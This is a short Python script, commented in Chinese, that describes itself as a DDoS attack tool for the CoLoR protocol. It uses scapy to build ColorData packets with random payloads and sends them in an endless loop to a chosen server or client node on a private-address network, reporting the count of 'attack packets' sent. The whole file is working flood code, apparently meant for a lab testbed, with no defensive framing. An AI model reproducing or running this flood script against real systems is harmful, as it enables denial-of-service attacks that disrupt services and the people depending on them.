''' docstring: 发送多种Data包的DDoS攻击 '''

import os
import sys
__BASE_DIR = os.path.dirname(os.path.dirname(
    os.path.abspath(__file__))).replace('\\', '/')
sys.path.append(__BASE_DIR)

if __name__ == '__main__':
    from CoLoRProtocol.CoLoRpacket import ColorData
    from scapy.all import IP, send
    from os import urandom
    import time
    pkt = IP(dst = "192.168.0.2", src = "192.168.0.1")

    cd = ColorData()
    cd.N_sid = b'\x00'*16
    cd.L_sid = b'\x11'*20
    nid_cus = bytes.fromhex("b0cd69ef142db5a471676ad710eebf3a")
    nid_pro = bytes.fromhex("d23454d19f307d8b98ff2da277c0b546")
    cd.Flags.F = True
    cd.Flags.S = True
    cd.PID_pt = 2

    PIDs1 = [bytes.fromhex("abcd6655"), bytes.fromhex("dcba2211")]
    PIDs2 = [bytes.fromhex("dcba4433"), bytes.fromhex("abcd2211")]

    text = "请选择攻击目标\n\t1 服务器 d23454d19f307d8b98ff2da277c0b546\n\t2 客户端 b0cd69ef142db5a471676ad710eebf3a\n"
    op = input(text)
    # print(op, len(op))
    if not (op == '1' or op == '2'):
        print("选择有误，本次攻击暂停")
        exit()
    cd.nid_cus = nid_pro if op == '1' else nid_cus
    cd.PIDs = PIDs2.copy() if op == '1' else PIDs1.copy()
    i = 0
    while True:
        payload = urandom(100)
        cd.Seg_ID = i
        send(pkt/cd/payload, verbose=0)
        if i % 10 == 9:
            print(f"\rDDoS攻击脚本启动, 已发送{i+1}个攻击包", end='')
        i += 1
